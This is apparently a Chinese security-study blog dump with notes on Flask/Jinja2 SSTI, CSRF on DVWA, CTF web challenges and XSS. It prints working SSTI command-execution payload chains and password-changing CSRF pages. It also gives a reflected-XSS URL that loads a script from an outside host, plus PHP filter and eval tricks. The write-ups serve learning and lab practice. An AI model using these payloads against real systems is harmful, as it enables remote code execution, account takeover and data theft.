in bar` 而不是 `not foo is bar` 和 `not foo in bar` 。所有的 其它表达式需要前缀记法 `not (foo and bar)​```#### 其它运算符- ``` 下面的运算符非常有用，但不适用于其它的两个分类: - in 运行序列/映射包含检查。如果左操作数包含于右操作数，返回 true 。比如 `{{ 1 in [1,2,3] }}` 会返回 true 。 - is 运行一个 [*测试*](http://docs.jinkan.org/docs/jinja2/templates.html#tests) 。 - |**重点** 应用一个 [*过滤器*](http://docs.jinkan.org/docs/jinja2/templates.html#filters) 。 - ~ 把所有的操作数转换为字符串，并且连接它们。 `{{ &quot;Hello &quot; ~ name ~ &quot;!&quot; }}` 会返回（假设 name 值为 `''John'` ） `Hello John!` 。 - () 调用一个可调用量:`{{ post.render() }}` 。在圆括号中，你可以像在 python 中一样使用位置参数和关键字参数: `{{ post.render(user, full=true) }}` 。 - #### . / [] 获取一个对象的属性。 内置过滤器清单**abs(number):**返回参数的绝对值**attr(obj,name):**获取对象的属性。foo|attr(&quot;bar&quot;)的工作方式类似于foo[&quot;bar&quot;]，只是总是返回一个属性，并且不查找任何项。**join（value，d=u&quot;,attribute=None）**:返回一个字符串，该字符串是系列中字符串的串联，元素之间的分隔符默认情况下是一个空字符串，您可以使用可选参数对其进行定义: {{ [1, 2, 3]|join('|') }} -&gt; 1|2|3{{ [1, 2, 3]|join }} -&gt; 123​```并且可以连接对象的某些属性: {{ users|join(', ', attribute='username') }}​```**last(seq)**:返回序列最后的一个元素:**length(object)：**返回序列中的项目数**list(value):**将值转换为列表。如果是字符串，则返回的列表将是字符列表。**random(seq):**从序列中返回一个随机项目**select():**可以用来选择对象: {{ numbers|select(&quot;odd&quot;) }}​```**selectattr():**这个可以用来选择需要的object int()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：{{ &quot;%s&quot; - &quot;%s&quot;|format('Hello?',&quot;Foo!&quot;) }}将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；pop(): 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值，在这里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()返回字符串的长度，别名是count​``` __class__ 类的一个内置属性，表示实例对象的类。__base__ 类型对象的直接基类__bases__ 类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__ 此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__() 返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ 初始化类，返回的类型是function__globals__ 使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')__builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]__str__() 返回描写这个对象的字符串，可以理解成就是打印出来。url_for flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。lipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}current_app 应用上下文，一个全局变量。__doc__:使用docstrings，每个对象都有自己的.__doc__属性，调用__doc__即为调用其文档字符串request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()request.args.x1 get传参request.values.x1 所有参数request.cookies cookies参数request.headers 请求头参数request.form.x1 post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data post传参 (Content-Type:a/b)request.json post传json (Content-Type: application/json)config 当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}g {{g}}得到&lt;flask.g of 'flask_ssti'&gt; 参考:https://blog.csdn.net/xiaolong22333/article/details/114228433http://ctf.ieki.xyz/library/ssti.htmlhttps://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters fuzz脚本结果（前辈整理）[].__class__.__base__.__subclasses__()[40].__init__.__globals__['os'].system('ls')[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].system('ls')&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('_ _import__(&quot;os&quot;).system(&quot;ls&quot;)')&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('_ _import__(&quot;os&quot;).system(&quot;ls&quot;)')&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system(&quot;ls&quot;)')''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['sys'].modules['os'].popen('ls').read()​```","link":"/2021/04/08/SSTI%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3/"},{"title":"TCP三次握手","text":"TCP三次握手https://blog.csdn.net/qzcsu/article/details/72861891这里有正经解释 通俗来说是:”让我知道你已经知道了”解释:客户端先发送请求报文给服务端，服务端收到报文后，也发送一个自己的确认报文（其中会包含请求报文中的内容）给客户端，客户端收到确认报文后，再发送确认收到报文给服务端(也包含服务端确认报文的信息)，接下来两者正式建立连接 TCP四次挥手解释：客户端发送终止报文给服务端，服务端收到报文后先回复一次，说它已经收到了，如果手头上没工作，那么再回复一次，如果手头上有工作，就等手头上的工作做完了，再回复，客户端收到第一次回复时，先不做反应，等收到第二次回复(fin信号)回复的时候，再回复一个确认信号，服务端收到这个最终释放确认信号的时候，就停止工作了，而客户端还要2*MSL（最长报文段寿命）的时间后，当客户端撤销相应的TCB后，才进入CLOSED状态。 为什么要经过最长报文段寿命再终止呢?:如果客户端最后的确认释放信号没有丢失，那么服务端将不会再回复，如果客户端最后的确认释放信号丢失，那么服务端将会重新回复让客户端再发送一次确认释放信号，这个时间就是用来确认释放信号是否丢失的。","link":"/2021/01/28/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B/"},{"title":"PHP函数","text":"PHP函数php函数的准则1.函数的名称应该提示出它的功能2.函数名称以字母或下划线开头这边先介绍一个function自定义函数格式是 1234function a()//a你想定义的函数的名称{ 该程序所要执行的指令；} 举个例子 举个例子 123456789&lt;?phpfunction writeName(){ echo &quot;Kai Jim Refsnes&quot;;}echo &quot;My name is &quot;;writeName();?&gt; 这个function函数还可以给函数设置一个变量格式是 123456function a($b)//b是你想要改变的那个变量名{ 你要执行的指令$b;}a(你想要改变的值); 举个例子 1234567&lt;?phpfunction a($b){ echo&quot;我心里的数字是&quot;.$b;//echo和$b中间的连接是个.}echo a(3);?&gt; 12输出结果：我心里的数字是3 PHP返回值的问题首先要理解什么是返回值，什么时候需要用返回值返回值，就是你运用一个函数，函数结束后，有一个结果，如果你需要那个结果，你就需要返回值举个例子 比如3+5=？，在程序当中我们需要这个答案的结果，就需要返回值 举个例子 123456789&lt;?phpfunction add($x,$y){ $total=$x+$y; return $total;}echo &quot;1 + 16 = &quot; . add(1,16);?&gt; 然后其他函数，遇到了再来补充","link":"/2020/10/14/PHP%E5%87%BD%E6%95%B0/"},{"title":"CSRF","text":"感觉要写的东西蛮多的，所以单独拉出来讲一下 CSRFCSRF，全程cross-site request forgery 翻译过来就是跨站请求伪造，是指利用受害者尚未是小的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账，改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。理解：攻击者盗用了你的身份，以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的财产 CSRF攻击原理 图片来自：https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html 漏洞检测通过html标签发送合法跨域请求抓取正常请求的数据包，如果不存在token验证，去掉请求头中Referer字段再重新提交，如果服务器返回正常页面，基本可以确定存在CSRF漏洞漏洞利用通过html标签发送合法跨越请求img表情不受同源策略的限制，使用img标签的src属性产生的跨域请求被浏览器认为是合法请求，诱导用户点击链接产生攻击 1&lt;img src=&quot;URL&quot; /&gt; 为什么说CSRF没有获取cookie，却能利用cookie攻击？攻击者的网站虽然是跨域的，但是他构造的链接是源网站的，因为源网站存在CSRF，构造的链接跟源网站同源，所以浏览器自动携带cookie发起访问 实现攻击1.缩写URL，如果我们直接耍上http://127.0.0.1:81/DVWA-master/vulnerabilities/csrf/?password_new=hacker1&amp;password_conf=hacker1&amp;Change=Change#这段，傻子都看得出来是个陷阱，所以这个时候我们可以利用网络上现有的URL缩写工具，进行缩写，以达到欺骗的目的2.构建404网页进行欺骗这里我们可以写一段html代码，将我们的URL藏匿于其中。 low：首先需要将网页放置在然后构建一个网站， 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt; &lt;img src=&quot;http://127.0.0.1:81/DVWA-master/vulnerabilities/csrf/?password_new=hacker1&amp;password_conf=hacker1&amp;Change=Change#&quot;border=&quot;0&quot; style=&quot;display:none;&quot;&gt;&lt;h1&gt; 404&lt;h1&gt; &lt;h2&gt; file not found.&lt;h2&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; 1有&lt;title&gt;记得要有&lt;/title&gt; 这样 当我们登录了这个网站后，DVWA那边的账号密码就发生了改变。还是很神奇的。 medium：1if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) stripos()函数：referer是否包含server_name中的参数server_name：http包头的Host参数，及要访问的主机名漏洞利用：因为他比对的是referer我们先看看正常修改的抓包页面： 在HOST和referer都含有127.0.0.1:81是，通过验证，所以修改密码成功，那么再我们的CSRF页面中， 这里的Referer和原页面的不一样，那么我们该如何修改呢？， **方法一**就是直接在文件名上动手将文件命名为何HOST一样 **但是**在这里不可行，因为文件名不能有冒号，所以在这里是行不通的 **方法二**直接burpsuit抓包，更改Referer 直接在这里添加即可，也可以绕过 high：1checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 这里比对的是token，每次都会生成一个不同的token，几种常见的CSRF方式： 1234&lt;img&gt;标签属性&lt;iframe&gt;标签属性&lt;script&gt;标签属性JavaScript方法：Image对象、XMLHTTP对象 HTML内联框架元素 (&lt;iframe&gt;) 表示嵌套的browsing context。它能够将另一个HTML页面嵌入到当前页面中。详细解释https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe#example2，感觉这个和img是一个意思，在网页中会直接被&quot;引用或者说打开？&quot;的感觉**HTML &lt;/script/&gt; **元素用于嵌入或引用可执行脚本。这通常用作嵌入或者指向 JavaScript 代码。 所以这题要绕过反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。搜寻了一下网络上的方法，整理可得:1.使用javascript脚本，在打开我们构建的危险时，脚本会通过框架偷偷打开修改密码的页面，获取其中的token，然后进行改密操作但是由于涉及跨域的操作，所以这个操作也是不行滴； 2.利用XSS漏洞：XSS还没学，等我学了再来补充吧。。。 拓展引语：任何的web脚本语言都可以选择以何种请求来接受数据，有$_GET $_POST $_REQUEST. get型：DVWA中， 12$pass_new = $_GET[ 'password_new' ];$pass_conf = $_GET[ 'password_conf' ]; 这里的数据就是get类型的，所以html页面的构建，像上面一样即可 POST型如何构建网页呢？ 12345678910111213&lt;form action=&quot;http://127.0.0.1:81/DVWA-master/vulnerabilities/csrf/&quot; method=POST&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;hacker1&quot;/&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;hacker1&quot;/&gt;&lt;input type=&quot;submit&quot; value=&quot;Change&quot; name=&quot;Change&quot;/&gt;&lt;/form&gt;&lt;body&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found&lt;h2&gt;&lt;/body&gt;&lt;script&gt;document.forms[0]sumit();//这里是用了一个自动提交的脚本&lt;/script&gt; 使用burpsuit进行扫描:","link":"/2021/01/22/CSRF/"},{"title":"bugku1&amp;攻防世界","text":"web8 就给了个这个 啥也无，所以就要想该如何获得flag, 我们看到 $_REQUEST()函数 他既可以接受get也可以接收post数据，所以 在这里，他的意思是获得一个hello的数据，所以我们就需要所以 我们在URL里面输入的时候就需要输入?hello=多少 然后这个多少会被代入到eval里面执行而我们对eval这个函数也不陌生了，他是将你输入的字符串转化为PHP代码来执行，但是两段命令之间需要用分号来隔开，而在这题中，他的flag似乎是包含在flag.php的文件夹中的，要获取flag就需要输出这个文件夹的内容：构建payload：http://114.67.246.176:10770/?hello=1);print_r(file(&quot;./flag.php&quot;)为什么可以使用print_r和var_dump而不使用echo呢？原因：前两个还可以输出复杂的数组类型 而echo仅能输出变量或字符串 12.18日看完黑盾被赛前培训思考： web9 在这题当中，我们看了一下代码 首先用了一个正则表达式，意思是如果在提交上来的值中包含不是字母或者数字的东西，将会被args error，那么我们在看下面 资料来源：https://blog.csdn.net/anjiaowangmenghan/article/details/76460872 所以我们可以知道当有两个$$的时候 第一个是为$args 假设我们让$args=as 那么最终就会变成 $as 那么就会执行$**这个变量所表示的值，那么再本题中，我们可以就可以利用这点，让他执行一个全局数组变量，也就是$GLOBALS $GLOBALS **— 引用全局作用域中可用的全部变量**说明一个包含了全部变量的全局组合数组。变量的名字就是数组的键。注意: 变量可用性与所有其他超全局变量不同，$GLOBALS在PHP中总是可用的。所以当我们调用$GLOBALS的时候，输出的将会是所有数组构建payload：http://114.67.246.176:11872/?args=GLOBALS 好的这样就行了 web11是否留下后门？要看是否留下后门我们要从哪里突破？根据那个教学视频，我们可以看看这个网站的网站目录看看有没有其他目录，这个时候我们就使用到一个叫做御剑的软件，是一个后台网站爆破的软件可以看到 它是由一个shell.php的网站的，那么这个时候我们打开一下这个shell.php试试 他需要我们输入PASS 这个时候我们可以直接用burp suit进行暴力破解即可PS:index.php 主体网站 web12在查看网页源代码的时候发现了这个 一个好像是经过加密的东西 然后我就去解码，发现是base64的编码，然后解码完后是test123 然后再看网页是需要我们输入管理员的账号和密码的，然后我们盲猜一波账号是admin 密码是这个试试 但是他一直说IP禁止访问，然后查了一下资料说是要用伪造一个XFF进行登录大概是这样的问题1：XFF是什么？XFF是header请求头中的一个参数 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 代表了HTTP的请求端真实的IP。 问题2：为什么看到IP被禁止可以想到伪造XFF？IP被禁止了，我们想要继续访问，可以通过伪造XFF来绕过服务器ip的过滤进行访问 web13正常用LFI去读/sqli/db.php文件 是无法读取它的源码 它会被当做php文件被执行 将只会输出结果 这个时候我们就可以使用php://filter构造payload:?file=php://filter/read=convert.base64-encode/resource=index.php php://filter在PHP官网上的解释是：它是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式的文件函数非常有用，类似readfile()、file()和file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器php://filter目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。 筛选过滤应用： 1、 字符串过滤器： string.rot13 对字符串执行ROT13转换 string.toupper转换为大写 string.tolower 转换为小写 string.strip_tags去除html和php标记 2、 转换过滤器： convert.base64-encode &amp; convert.base64-decode ：**base64编码和解码** convert.quoted-printable-encode &amp; convert.quoted-printable-decode**：**将 quoted-printable 字符串转换为 8-bit 字符串 3、 压缩过滤器： zlib.deflate**和** zlib.inflate bzip2.compress**和** bzip2.decompress 4、 加密过滤器： mcrypt.tripledes和mdecrypt.tripledes等资料来源：https://www.cnblogs.com/natian-ws/p/7242477.html web16ini_set()函数： 不显示报错信息strstr()函数：strstr(string,search,before_search)资料来源：https://www.runoob.com/php/func-string-strstr.html所以我们可以知道 这句话的意思是 从提交上来的url字符串中搜索， 搜索？以后的内容，所以$str=?=….. substr()函数这个函数我们之前已经遇到过了，但是上一次没有学清楚我觉得 语法：substr(string,start,length)所以说 在这句话中它的意思是返回从第一个字符开始往后的内容所以我们最后这个substr==。。。。。然后是 srt_replace就是一个正则替换吧 他的意思是吧key换成无值**parse_str()**函数语法：parse_str(string,array)’//后面的array可不选，选了以后意思是将string中的字符串数组变量存储到定义的array这个数组当中他的作用是将查询字符串解析到变量中举个例子吧parse_str(“name=hh&amp;age=18”);echo $name;echo $age; 这样的结果是 hh 和18； 那么这题究竟什么意思呢？ 1234567echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){ echo $flag.&quot;取得flag&quot;;}?&gt; 他的意思就是 我输入两个key 在经过去掉问号去掉key以后 如果两个的md5值相等，但是两个key本身不相等那就输出flag所以我需要找两个MD5值相等的字符串：思路1.如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。（也就是我使用的方法） 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387aindex.php?kekeyy1=QNKCDZO&amp;kekeyy2=240610708 2.md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。 所以可以输入：http://120.24.86.145:8002/web16/index.php?kekeyy1[]=something&amp;kekeyy2[]=anything资料来源：https://www.cnblogs.com/yuluoluo/p/9782327.html web-php-include文件包含漏洞文件包含简介：服务器执行PHP代码的时候，可以通过文件包含函数加载另一个文件夹中的PHP代码，并且当PHP来执行，这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。文件包含函数require()require_once()include()include_once() include 和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 漏洞产生原因：文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。 1234&lt;?php $filename = $_GET['filename']; include($filename); ?&gt; 例如：$_GET['filename']参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$_GET['filename']的值，执行非预期的操作。 漏洞分类： 本地文件包含漏洞1.无限制本地文件包含漏洞2.session文件包含漏洞3.有限制本地文件包含漏洞绕过 远程文件包含漏洞1.无限制远程文件包含漏洞2有限制远程文件包含漏洞绕过3.问号井号绕过 参考资料：https://www.freebuf.com/news/182280.html 分析源码：show source（）展示文件，文本中高亮的部分include（），加载$page这个变量当中所指向的文件夹中的代码str_replace：正则替换，过滤掉php：//strstr()：前面遇过，就是搜素所以代码是这样的，输出的是hello参数，而被加载文件文本代码的是$page变量中的内容思路：我们的思路是，让$page所得到的内容经由hello显示出来 在看黑盾杯的教学视频中实在不懂为啥可以?page=http://127.0.0.1/index.php/?hello=所以就先跳过这个方法吧。方法一：使用php://input封装协议感觉这个思想挺巧妙的，这个php://input可以让page读取我们用post上传的文件（我们写一段完整代码也是一个文件然后因为这边有过滤，所以我们就可以使用那几钟绕过方式这边使用大小写绕过：我无语了 粘贴复制画面都无反应感觉很多代码都没陌生，我认为还是继续去刷upload-labs吧，后面多学点再来补充吧 web20:打开网页，是一串字母，看着不像被加密过的再看看URL 1?line=&amp;filename=a2V5cy50eHQ= a2V5cy50eHQ=像是被base64加密过得解码后得：keys.txt用御剑扫描后台发现有keys.txt 推测可得，网页存在文件包含漏洞 ?line代表的是行数 默认是第一行 后面的filename是文件名，接下来就是尝试了: 读取一下index.php文件试试，先将其用base64进行编码，然后输入到url中，在一行行查看代码中，我们发现在后面有说一个 1if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin') ，就可以看keys.php，那么让我们伪造试试 好的成功 web21查看网页源码，感觉没啥，然后只能看看有什么信息能利用，使用御剑，看看有没有其他后台，发现没有收获，看了下题解，网页源码有一个1p.html，直接访问，发现会跳转，可以推测出其源码有href属性，然后直接view-source:http://114.67.246.176:16013/1p.html，使用view-source前缀即可直接查看网页源码，发现script使用了urlcode，经过解码，是 1&lt;script&gt; href=&quot;URL&quot;&lt;/script&gt; 再看后面，又是base64加密，解码以后得到urlcode加密，然后再解码: 1234567891011121314151617181920212223if(!$_GET['id']){ header('Location: hello.php?id=1'); exit();}$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')){ echo 'no no no no no no no'; return ;}$data = @file_get_contents($a,'r');if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4){ $flag = &quot;flag{***********}&quot;}else{ print &quot;never never never give up !!!&quot;;}?&gt; 得到以上代码，让我们康康这段代码写了啥 看看他这几个判断，首先是id为空则直接跳转一下连接，非空则不执行接下来她会get获取id a b 三个变量的值，如果a当中有‘.’那么将会直接执行那个判断语句， file_get_contents — 将整个文件读入一个字符串，这里指的是将$a所定义的文件读入一个字符串，所以这里就是一个考点，不让我们直接导入文件，但是又需要读取文件，想到直前的php:/input然后在下面写一个post:bugku is a nice plateform再往下就是拿到flag的限制条件了:我们先来看a吧eregi(a,b,c)函数：在b中寻找a，如果有匹配到，就将匹配项给c在这题中，只有两个参数那个点要注意看！！是连接符，不是逗号，所以这里的意思是111和b的第一个字符进行连接，并和1114进行匹配，且b的第一个字符不能为4，长度要大于5搜索知道 ereg和eregi的截断漏洞：①%00截断及遇到%00则默认为字符串的结束②当ntf为数组时它的返回值不是FALSE 这里我们使用第一个漏洞 接下来就是id了，id他说要非空非零后面弱类型比较又要等于0，我们就去找找有没有松散比较的类型：从这个图我们知道，字符串和0是弱相等的，所以：综合以上即可得到flag","link":"/2020/12/15/bugku1/"},{"title":"XSS漏洞","text":"XSS简介XSS跨站脚本攻击(Cross Site Scripting),是将Java script代码插入web页面中，之后当用户浏览页面时, 会执行嵌套在web页面里面的Java script代码,从而达到攻击用户的目的。为了跟HTML里面的层叠样式表(CSS ,Cascading Style Sheets)作区分，所以叫作XSS. XSS本质恶意代码未经过滤，与网站正常的代码混在一起，浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。在部分情况下，由于输入的限制，注入的恶意脚本较短，但可以通过引入外部的脚本，并有浏览器执行，来完成比较复杂的攻击策略 理解:XSS攻击和sql注入还蛮像的，都是注入恶意语句，但是xss是针对网站的 注入方式 来自用户的 UGC 信息//UGC:UGC 互联网术语，全称为User Generated Content，也就是用户生成内容，即用户原创内容 来自第三方的链接 URL 参数 POST 参数 Referer （可能来自不可信的来源） Cookie （可能来自其他子域注入） 分类根据攻击的来源，XSS攻击可以分为存储型，反射性和DOM型三种 类型 存储区 插入点 存储型XSS 后端数据库 HTML 反射型XSS URL HTML DOM型XSS 后端数据库/前段存储/URL 前段JavaScript 参考：https://tech.meituan.com/2018/09/27/fe-security.html 反射型XSS攻击反射型XSS漏洞常见于通过URL传递参数的功能，如网站搜索，跳转等。由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。比如下面的URL： 1http://x.x.x.x:8080/dosomething?message=&quot;&lt;script src=&quot;http://www.hacktest.com:8002/xss/hacker.js&quot;&gt;&lt;/script&gt;&quot; 或者 http://localhost/test.php?param=&lt;script&gt;alert(/xss/)&lt;/script&gt; POST的内容也可以触发反射型XSS，只不过它的触发条件比较苛刻（构建表单提交页面，并引导用户点击），所以非常少见(但是不是可以) 攻击步骤1.攻击者构造出特殊的URL，其中包含恶意代码.2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器.3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。 注意：Chrome和Safari能够检测到url上的xss攻击，将网页拦截掉，但是其他浏览器不行，如IE和Firefox。图片来源:https://www.cnblogs.com/54chensongxia/p/11643787.html 存储型XSS攻击恶意脚本永久存储在目标服务器上，当浏览器请求数据时，脚本从服务器传回并执行，影响范围比反射型和DOM型更大，存储型XSS攻击的原因仍然是没有做好数据过滤：前端提交数据至服务器端时，没有做好过滤;服务端在按受到数据时，在存储之前，没有做过滤;前端从服务器端请求到数据，没有过滤输出。 攻击步骤1.攻击者将恶意代码提交到目标网站的数据库中。2.用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作.这种攻击常见于带有用户保存数据的网站功能，如论坛发帖，商品评论，用户私信等。 DOM型XSS攻击DOM型XSS攻击，实际上就是前端javascript代码不够严谨，把不可信的内容插入到了页面，在使用.innerHTML、.outerHTML、.appendChild、document.write()等API时要特别小心，不要把不可信的数据作为HTML插入到页面上，尽量使用.innerText、.textContent、.setAttribut()等. 攻击步骤1.攻击者构造出特殊数据，其中包含恶意代码。2.用户浏览器执行了恶意代码3.恶意窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作. tipDOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端javascript自身的安全漏洞. 参考来源:https://www.cnblogs.com/54chensongxia/p/11643787.html 学习完理论知识就可以开始实践了 实践反射型:根据前面的介绍我们知道，反射型XSS主要是构造于URL上（GET类型）以DVWA为例 我们查看页面源码当我们输入 123&lt;img src=1 onerror=alert(/xss/)/&gt;或者使用&lt;script&gt;alert(/xss/)&lt;/script&gt;//直接使用脚本语言 1HTML &lt;script&gt; 元素用于嵌入或引用可执行脚本。这通常用作嵌入或者指向 JavaScript 代码。 参考：https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/script以后，他在浏览器被渲染的时候，执行了 alert()函数后便会弹框说明了，我们的危险语句在网页中发挥了作用 存储型：存储型是指我们输入的代码被存储到数据库中，只要有用户点击该URL(产生查询数据库的操作)，xss语句即发挥作用 当我们从其他页面点回来这个页面，这个窗口就会马上跳出，为什么呢？就如前面所说的，这个页面要展现留言，肯定是调用了查询数据库的功能，并将其显示在网页上，而我们之前输出的语句因为也被存储在同一个数据库中，被查询出来显示在网页上，就会执行其中的html语句，也就是这个弹窗 DOM型：DOM 操作：可以简单理解成“元素操作“，类似于你要更换背景颜色，更换语言，或者删除可以看到这里做了一个更换语言的代码，将原本的语言替换成我们更换的语言，我们在url上插入恶意语句，单击替换即可看到页面弹出框，为什么会弹出框，就是因为我们的script语句被html识别并执行了 整理XSS常用语句及编码绕过常用的测试语句有: 1234&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=x(任意数) onerror=alert(1) &gt;&lt;svg onload=alert(1)&gt;&lt;a href=javascript:alert(1)&gt; 关于svg（是一种图片格式）在HTML中可以使用的其他标签https://www.runoob.com/svg/svg-inhtml.html 12&lt;a&gt;标签定义超链接，用于从一张页面链接到另一张页面。标签的 href 属性用于指定超链接目标的 URL。href 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。如果用户选择了 &lt;a&gt; 标签中的内容，那么浏览器会尝试检索并显示 href 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表。 绕过姿势：这里有必要再了解一下浏览器的解码与编码（看博客http原理） JS编码：JS提供了四种字符编码的策略：1.三个八进制数字 如果个数不够，在前面补0 比如e的编码为\\1452.两个十六进制数字 同上 \\x653.四个十六进制数字 \\u00654.对于一些控制字符，使用特殊的C类型的转义风格（如\\n和\\r） 